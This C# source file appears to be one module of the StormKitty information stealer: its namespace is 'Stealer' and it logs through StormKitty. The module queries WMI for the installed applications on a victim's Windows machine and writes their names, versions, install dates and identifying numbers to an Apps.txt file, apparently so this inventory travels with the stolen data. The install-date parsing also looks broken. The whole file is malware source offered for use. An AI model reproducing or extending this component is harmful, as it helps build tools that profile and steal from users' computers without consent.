
using System;
using System.Management;
using System.Collections.Generic;

namespace Stealer
{
    internal sealed class InstalledApps
    {

        internal struct App
        {
            public string Name { get; set; }
            public string Version { get; set; }
            public string IdentifyingNumber { get; set; }
            public string InstallDate { get; set; }
        }

        // Get installed applications
        public static void WriteAppsList(string sSavePath)
        {
            List<App> Apps = new List<App>();
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
                foreach (ManagementObject row in searcher.Get())
                {
                    App app = new App();
                    if (row["Name"] != null)
                        app.Name = row["Name"].ToString();
                    if (row["Version"] != null)
                        app.Version = row["Version"].ToString();
                    if (row["InstallDate"] != null)
                    {
                        int seconds = Int32.Parse(row["InstallDate"].ToString());
                        TimeSpan time = TimeSpan.FromSeconds(seconds);
                        DateTime dateTime = DateTime.Today.Add(time);
                        app.InstallDate = dateTime.ToString("dd/MM/yyyy HH:mm:ss");
                    }
                    if (row["IdentifyingNumber"] != null)
                        app.IdentifyingNumber = row["IdentifyingNumber"].ToString();

                    Apps.Add(app);
                }
            } catch (Exception ex) { StormKitty.Logging.Log("InstalledApps fetch error:\n" + ex); }
            
            //Apps.Sort();
            foreach (App app in Apps)
                System.IO.File.AppendAllText(
                        sSavePath + "\\Apps.txt",
                        $"\nAPP: {app.Name}" +
                        $"\n\tVERSION: {app.Version}" +
                        $"\n\tINSTALL DATE: {app.InstallDate}" +
                        $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
                        $"\n\n");
        }
    }
}
